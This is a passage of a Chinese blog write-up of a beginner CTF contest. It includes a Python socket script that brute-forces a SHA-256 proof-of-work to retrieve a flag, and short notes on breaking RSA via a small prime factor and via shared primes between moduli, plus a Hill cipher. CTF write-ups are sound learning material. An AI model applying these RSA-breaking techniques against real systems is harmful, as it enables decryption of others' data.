+<p>sha256 加密后开头的值是会变化的，只要做过番外 1，知道了怎么写 socket，这题也差不多难度吧(先跑出来手动提交也可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ipPort = (<span class="string">'121.42.25.113'</span>,<span class="number">20001</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.connect(ipPort)</span><br><span class="line">mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line">mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">pat = <span class="string">'with.*'</span></span><br><span class="line">mes = re.search(pat,mes).group(<span class="number">0</span>)[<span class="number">5</span>:].split(<span class="string">' '</span>)</span><br><span class="line">start = <span class="string">''</span>.join(mes)</span><br><span class="line"><span class="keyword">print</span> start</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>))</span><br><span class="line">    hash = hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">print</span> hash[:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> hash[:<span class="number">6</span>] == start:</span><br><span class="line">      sk.sendall(s + <span class="string">'\n'</span>)</span><br><span class="line">      mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag is '</span> + mes</span><br><span class="line">sk.close()</span><br></pre></td></tr></table></figure></p>
+<p>看运气的题目 233</p>
+<h3 id="我是一个有格调的misc题目"><a href="#我是一个有格调的misc题目" class="headerlink" title="我是一个有格调的misc题目"></a>我是一个有格调的misc题目</h3><blockquote>
+<p>题目描述：<br>链接：<a href="http://pan.baidu.com/s/1o8wJuGU" target="_blank" rel="external">http://pan.baidu.com/s/1o8wJuGU</a> 密码：pewf</p>
+</blockquote>
+<p>flag 在请求 url 里，搜下就有了</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="密码学教室进阶（五）"><a href="#密码学教室进阶（五）" class="headerlink" title="密码学教室进阶（五）"></a>密码学教室进阶（五）</h3><blockquote>
+<p>题目描述： n=0xee290c7a603fc23300eb3f0e5868d056b7deb1af33b5112a6da1edc9612c5eeb4ab07d838a3b4397d8e6b6844065d98543a977ed40ccd8f57ac5bc2daee2dec301aac508f9befc27fae4a2665e82f13b1ddd17d3a0c85740bed8d53eeda665a5fc1bed35fbbcedd4279d04aa747ac1f996f724b14f0228366aeae34305152e1f430221f9594497686c9f49021d833144962c2a53dbb47bdbfd19785ad8da6e7b59be24d34ed201384d3b0f34267df4ba8b53f0f4481f9bd2e26c4a3e95cd1a47f806a1f16b86a9fc5e8a0756898f63f5c9144f51b401ba0dd5ad58fb0e97ebac9a41dc3fb4a378707f7210e64c131bca19bd54e39bbfa0d7a0e7c89d955b1c9fL<br>e=0xe438fddb77f9bc2cf97185041e8a5ce8d0853cbfb657b940505870f0d3dfc0b723c5f7c8c9b940769f358397e275d00cce1cf760f9892a4b83ff90cbe513c6cc450258d02bcee33e499fb028c2b0d811bba22ef0c4fea314018d4943451ecdeb5d6e98bd5ed71ab7862a747f851c532aeae6c29f52c3f9be649a4142810ddb83015386fd035fcdc28059236135a9cce24fd650062067dcf43f5dcf24e15f132e9dca4ff68cc76jiuyoulejiuyoule37139dbdba276157f11e8af118d8dfae3f811a0377ba37555f9L<br>c=0xbe864c22e69bd872541b7538b3c9797cf76afa2b2cac70c5a1a47fb6b6046daf345946d6e0eb299d12a7485ad9edaced28ef0b3169a22d1cba69c1e556ed2a69b6eca7e030f8cf61616faff4e063caf1a0668d4357594e7ff8887f00f61df5161e94f2197abcc2d34db666a34fa9e0f108c7937dc09b8e091ba2a4180f88f1b58229891bd619025f2c13f5758d7f4f6ac8f4d3f565449a730fef9ecee37f5409b801b554a30cfb42f69afc734b7709c5df6618e94e96b5d24a4b63cd1907296ae9bbd36084bad58c5e5cb3d275c953efc73aff595f36d92e182d6705fee14dabd29df53735132249d5935f8e780210359d67ab80ac2dfa29a88a5f585cbda8bbL</p>
+</blockquote>
+<p>我们知道 RSA 的安全性依赖于大数分解的困难度，这题的 n 容易分解的原因是其中一个素因数太小了，分解成 p 和 q 后就是老套路了</p>
+<h3 id="密码学教室进阶（六）"><a href="#密码学教室进阶（六）" class="headerlink" title="密码学教室进阶（六）"></a>密码学教室进阶（六）</h3><blockquote>
+<p>题目描述： 我只是想用事实告诉你们学好线代很重要<br>Hill密码：<a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="external">https://en.wikipedia.org/wiki/Hill_cipher</a><br>m:jchfecncvxogmtgqtqlqamqutqsgnniw<br>key:5 17 4 15<br>完成解密以后加上hgame{}作为flag</p>
+</blockquote>
+<p>懒得写脚本了，找了个在线网站解的<br><a href="http://crypto.interactive-maths.com/hill-cipher.html" target="_blank" rel="external">http://crypto.interactive-maths.com/hill-cipher.html</a></p>
+<h3 id="进击的-Crypto-0"><a href="#进击的-Crypto-0" class="headerlink" title="进击的 Crypto [0]"></a>进击的 Crypto [0]</h3><blockquote>
+<p>题目描述： 听说你们喜欢暴力出奇迹?我觉得选择也很重要<br><a href="http://119.29.138.57/crypto/easy_rsa.txt.34b3396feff9f911a61e932a22c4470" target="_blank" rel="external">http://119.29.138.57/crypto/easy_rsa.txt.34b3396feff9f911a61e932a22c4470</a></p>
+</blockquote>
+<p>分数给高了，这题考点是 RSA 中的共享素数攻击，测试一下就会发现几组 n 都不是互素的，所以大数分解问题就转变成了求两数的最大公约数问题，接下来就没啥难度了，基本能看出来这点的就可以做出来了(会不会真的有暴力跑 n 的(逃</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Crypto 的题目还是入门级别吧，连真正 CTF 的签到都算不上，web 里两个系列也是，ez game 还是挺强的，虽说改编的原题。继续学吧！</p>
+<p>最后，祝大家新年吼啊！</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
